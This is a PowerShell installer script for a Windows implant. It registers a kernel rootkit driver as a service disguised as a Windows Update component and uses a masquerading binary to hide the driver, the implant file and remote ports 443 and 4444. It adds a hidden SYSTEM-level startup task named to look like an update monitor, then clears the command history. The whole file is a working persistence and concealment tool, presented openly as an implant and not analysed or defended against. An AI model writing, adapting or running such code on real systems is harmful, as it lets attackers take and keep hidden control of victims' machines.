# Install_Implant_Manual.ps1 - Run this AFTER files are in System32
$TargetDir = "C:\Windows\System32"

Write-Host "[+] Starting Manual Implant Installation..." -ForegroundColor Cyan

# 1. Register & Start Driver
sc.exe create "WindowsUpdateSvc" type= kernel start= auto binPath= "$TargetDir\drivers\Nidhogg.sys" | Out-Null
sc.exe start "WindowsUpdateSvc" | Out-Null
Write-Host "[+] Driver registered and started" -ForegroundColor Green

# 2. Apply Initial Nidhogg Protections
if (Test-Path "$TargetDir\wuauclt.exe") {
    $n = "$TargetDir\wuauclt.exe"
    & $n driver hide "$TargetDir\drivers\Nidhogg.sys"
    & $n file hide "$TargetDir\Implant.ps1"
    & $n port hide 443 tcp remote
    & $n port hide 4444 tcp remote
    Write-Host "[+] Nidhogg protections applied" -ForegroundColor Green
}

# 3. Create Main Persistence Task
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File $TargetDir\Implant.ps1"

$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "Windows Update Health Monitor" `
    -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null

Write-Host "[+] Persistence task created" -ForegroundColor Green

# 4. Cleanup
Clear-History
Write-Host "`n=== Manual Installation Complete ===" -ForegroundColor Green
Write-Host "Reboot recommended." -ForegroundColor Yellow